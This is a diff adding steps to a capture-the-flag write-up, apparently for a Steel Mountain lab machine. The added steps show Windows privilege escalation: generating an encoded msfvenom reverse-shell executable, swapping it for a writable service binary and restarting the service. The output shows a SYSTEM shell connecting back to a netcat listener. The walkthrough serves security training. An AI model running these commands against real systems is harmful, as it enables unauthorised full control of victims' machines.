@@ -163,6 +163,91 @@ PS > . .\PowerUp.ps1
 PS > Invoke-AllChecks
 ```
 
-Looking through we can see that **AdvancedSystemCareService9** applies to both criteria we were looking for. The unquoted service could be exploited, but we're just going to abuse the weak file permissions to restart the service on the system. It's worth noting that the directory to the application is also write-able. Now we can just swap the actual application with our malicious version, restart the service, and run it get root.
+Looking through we can see that **AdvancedSystemCareService9** applies to both criteria we were looking for. The unquoted service could be exploited, but we're just going to abuse the weak file permissions to restart the service on the system. Go ahead and close the Powershell session with CTRL+C to get back to meterpreter.
 
 4. What is the root flag?
+
+Since the directory (C:\Program Files (x86)\IObit\Advanced SystemCare\) to the application is write-able, we can copy our infected binary there with meterpreter. Now we just need to swap the actual application with our malicious version, restart the service, and run it get root and find the flag.
+
+To create this infected binary reverse shell we are going to use msfvenom to generate our payload. 
+* We set the payload to a windows reverse tcp shell.
+* We set the LHOST to our OpenVPN Tun0.
+* We need a new port since we are using 4444, so I will just use 4445.
+* We need to encode it with x86/shikata_ga_nai.
+* We need to format as an executable because that is what the service is running as.
+* We need to specify the output name to the service we will be replacing.
+
+```linux
+msfvenom -p windows/shell_reverse_tcp LHOST=Tun0-IP LPORT=4445 -e x86/shikata_ga_nai -f exe -o ASCService.exe
+```
+
+Once you have generated this payload in your SteelMountain directory, hop back over to the meterpreter session. 
+* We are going to first upload our infected binary.
+* We will then execute a cmd and use sc to stop the legitimate service.
+* We will then swap the services using the cmd.
+
+```linux
+meterpreter > upload ASCService.exe
+[*] uploading  : ASCService.exe -> ASCService.exe
+[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): ASCService.exe -> ASCService.exe
+[*] uploaded   : ASCService.exe -> ASCService.exe
+meterpreter > execute -f cmd.exe -i -H.
+Process 3136 created.
+Channel 4 created.
+```
+```cmd
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc stop AdvancedSystemCareService9
+sc stop AdvancedSystemCareService9
+
+SERVICE_NAME: AdvancedSystemCareService9 
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING 
+                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+copy ASCService.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+Overwrite \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe? (Yes/No/All): yes
+yes
+        1 file(s) copied.
+```
+
+Now that we have swapped the files, we want to open a netcat listener on the port (I used 4445) before restarting the service.
+
+```linux
+nc -lvnp 4445
+```
+
+Finally, cross your fingers and restart the service using the cmd session.
+
+```cmd
+sc start AdvancedSystemCareService9
+```
+
+WIN! Hop back over to that netcat listener and run a quick whoami.
+
+```cmd
+listening on [any] 4445 ...
+connect to [10.6.40.191] from (UNKNOWN) [10.10.98.28] 49370
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+We have achieved system which is essentially root for windows. Go and find that flag! A quick way to find it is by using the below cmd command (I added a star at the end because sometimes they are "root.txt.txt"). You can use type root.txt to view it in the cmd. If you accidentally close your netcat session (oops!), just start the service again with your meterpreter cmd session.
+
+```cmd
+dir "\root.txt*" /s
+```
+
+## Task 4: Access and Escalation Without Metasploit
+
+One of the best ways to get better at CTFs like this is to find alternatives. There's almost always plenty of other options/paths you can take and you can learn a lot from finding new routes.
